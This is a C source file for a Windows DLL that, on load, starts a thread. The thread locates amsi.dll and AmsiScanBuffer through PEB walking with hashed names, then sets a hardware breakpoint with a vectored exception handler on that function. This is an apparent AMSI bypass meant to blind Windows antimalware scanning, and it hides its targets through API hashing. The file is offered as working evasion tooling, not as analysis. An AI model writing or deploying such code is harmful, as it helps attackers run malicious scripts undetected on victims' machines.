#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#include "hardwareBreakpoint.h"
#include "peb.h"
#include "tools.h"

// Global variable to store the address of AmsiScanBuffer
PVOID g_amsScanBuffer = NULL;

// Hashes for the DLL and function names
unsigned int ams = 0xD6AC7F93; // Hash for "amsi.dll"
unsigned int amsb = 0xF4B85414; // Hash for "AmsiScanBuffer"

DWORD WINAPI HookThread(LPVOID lpParam) {
    PVOID pebAddr = pebWalking(ams);
    g_amsScanBuffer = peParsing(pebAddr, amsb);
    AddVectoredExceptionHandler(1, VEH_Handler);
    SetDR0Breakpoint(g_amsScanBuffer);
    return 0;
}

// DllMain function to initialize the DLL : on attach 
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
    }
    return TRUE;
}